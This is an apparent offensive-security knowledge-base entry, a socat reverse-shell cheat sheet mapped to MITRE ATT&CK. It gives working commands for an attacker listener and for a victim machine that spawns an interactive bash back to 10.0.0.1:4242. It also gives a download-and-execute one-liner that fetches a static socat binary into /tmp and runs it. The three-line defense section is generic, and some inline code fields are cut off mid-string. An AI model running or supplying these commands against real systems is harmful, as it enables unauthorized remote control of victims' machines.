---
id: 5a5024c5-6736-435a-a607-0e826c7d1a00
name: Socat Reverse Shell Cheat Sheet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.204683+00:00'
updated_at: '2023-04-10T20:25:32.730778+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
- '[[Socat]]'
commands:
- '[[Download and execute reverse shell using socat]]'
---

# Socat Reverse Shell Cheat Sheet

## Summary

This procedure provides a cheat sheet for establishing a reverse shell with Socat. A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. Socat is a command line based utility that establishes two bidirectional byte streams and transfers data betw

## Description

# Description

This procedure provides a cheat sheet for establishing a reverse shell with Socat. A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. Socat is a command line based utility that establishes two bidirectional byte streams and transfers data between them. This can be used to establish a reverse shell between the attacking and target machines. This technique can be used by attackers to gain remote access to a target machine and execute commands.

 

## Requirements

1. Access to the target machine's command line interface

1. Socat installed on both the attacking and target machines

1. Network connectivity between the attacking and target machines

 

## Defense

1. Ensure that Socat is installed only on trusted machines and is not accessible by unauthorized users

1. Monitor network traffic for any suspicious activity related to Socat

1. Implement strong access controls such as firewalls and user authentication mechanisms to prevent unauthorized access to the target machine

 

## Objectives

1. Establish a reverse shell with a target machine using Socat

1. Execute commands on the target machine remotely

 

# Instructions

1. To establish a reverse shell using socat, follow the below steps:
1. On the attacker machine, run the following command: socat file:`tty`,raw,echo=0 TCP-L:4242
2. On the victim machine, run the following command: /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
3. You should now have a reverse shell on the attacker machine.
Note: Don't forget to replace the IP address in the command with your own IP address.

 



**Code**: [[user@attack$ socat file:`tty`,raw,echo=0 TCP-L:424]]



> This command creates a reverse shell connection between the attacker and victim machine using socat. The 'file:`tty`,raw,echo=0 TCP-L:4242' option listens on port 4242 on the attacker machine and waits for a connection from the victim machine. Once a connection is established, the victim machine executes the '/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242' command which connects back to the attacker machine on port 4242. This command spawns a bash shell with a pseudo-terminal and redirects all output to the TCP connection. The attacker machine now has a reverse shell on the victim machine and can execute commands as if they were sitting in front of the victim machine.

2. This command downloads the socat binary from a Github repository and saves it to the /tmp directory. It then sets the execute permission on the binary and executes it to establish a reverse shell to the attacker's IP address (10.0.0.1) on port 4242.

 



**Code**: [[user@victim$ wget -q https://github.com/andrew-d/s]]



> The 'wget' command is used to download the socat binary from the specified URL. The '-q' option is used to suppress output. The '-O' option is used to specify the output file name. The 'chmod' command is used to set the execute permission on the downloaded binary. The 'exec' option is used with socat to execute the specified command. In this case, it executes a bash shell with the '-li' option, which starts an interactive login shell. The 'pty' option is used to allocate a pseudo terminal. The 'stderr' option redirects standard error to the socket. The 'setsid' option is used to run the process in a new session. The 'sigint' option is used to allow the process to receive SIGINT signals. The 'sane' option is used to set the terminal to a sane state. Finally, the 'tcp' option is used to specify the type of socket to be used, along with the IP address and port number of the attacker's machine.



**Command** ([[Download and execute reverse shell using socat]]):

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Remote Access Tools|T1219 - Remote Access Tools]]

## Commands Used

- [[Download and execute reverse shell using socat]]

## Tags

- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
- [[Socat]]


